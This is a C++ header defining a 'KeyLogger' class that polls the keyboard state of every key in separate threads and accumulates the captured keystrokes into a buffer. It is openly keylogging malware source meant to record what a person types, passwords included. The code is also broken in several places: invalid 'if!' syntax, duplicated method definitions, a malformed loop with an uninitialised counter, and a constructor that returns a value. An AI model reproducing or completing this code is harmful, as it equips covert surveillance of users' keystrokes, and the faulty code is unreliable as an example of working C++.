#pragma once
#include <string>
#include <thread>

#define ZERO 0x30

#define ONE 0x31

#define TWO 0x32

#define THREE 0x33

#define FOUR 0x34

#define FIVE 0x35

#define SIX 0x36

#define SEVEN 0x37

#define EIGHT 0x38

#define NINE 0x39

#define SPACE 0x20

#define TAB 0x09

#define BACKSPACE 0x08

#define ENTER 0x0D

#define CAPSLOCK 0x14

#define SHIFT 0x10

class KeyLogger {

public:

	KeyLogger(int Seconds);

	~KeyLogger();

	bool KeyCheck(int KeyNum);

	int IsSetLowBit(int Number);

	int IsSetHighBit(int Number);

	std::string KeyToChar(int KeyNum);

	std::string BufferString;

	DWORD WINAPI RecursiveKeyCheck(int KeyNum);

	bool Stop = false;

	int IsSetLowBit(int Number){

		if(Number%2){

			return 0;

		}

		if!(Number%2){

			return 1;

		}

		return 0;

	}

	int IsSetHighBit(unsigned int Number){

		int HiBit;

		for (int i = sizeof(unsigned int) * 8; i > 0; i--){

			HiBit=(Number & 1);

			Number>>=1;

		}

		if(HiBit){

			return 0;

		}

		if!(HiBit){

			return 1;

		}

		return 0;

	}



	std::string KeyToChar(int KeyNum) {

		switch (KeyNum) {

		case ZERO:

			return "0";

			break;

		case ONE:

			return "1";

			break;

		case TWO:

			return "2";

			break;

		case THREE:

			return "3";

			break;

		case FOUR:

			return "4";

			break;

		case FIVE:

			return "5";

			break;

		case SIX:

			return "6";

			break;

		case SEVEN:

			return "7";

			break;

		case EIGHT:

			return "8";

			break;

		case NINE:

			return "9";

			break;

		case TAB:

			return "<TAB>";

			break;

		case BACKSPACE:

			return "<BACKSPACE>";

			break;

		case ENTER:

			return "<ENTER>";

			break;

		case SHIFT:

			return "<SHIFT>";

			break;

		case CAPSLOCK:

			return "<CAPSLOCK>";

			break;

		case SPACE:

			return " ";

			break;

		default:

			std::string HexString;

			char HexCharacter = (char)KeyNum;

			HexString += HexCharacter;

			return HexString;

		}

	}

	DWORD WINAPI RecursiveKeyCheck(int KeyNum) {

		while (true) {

			if (Stop) {

				return 0;

			}

			if (KeyCheck(KeyNum)) {

				BufferString += KeyToChar(KeyNum);

			}

		}

		return 0;

	}

	bool KeyCheck(int KeyNum) {

		int KeyStat = GetAsyncKeyState(KeyNum);

		if (KeyStat > 0) {

			return true;

		}

		else {

			return false;

		}

	}

	KeyLogger(int Seconds) {

		for (int I; I++; I < 0xFE) {

			CreateThread(NULL, 512, RecursiveKeyCheck, I, NULL);

		}

		Sleep(Seconds);

		Stop = true;

		char * Buffer = new char[BufferString.length() + 1];

		strncpy(Buffer, BufferString.c_str(), BufferString.length());

		return Buffer;

	}

};
//final
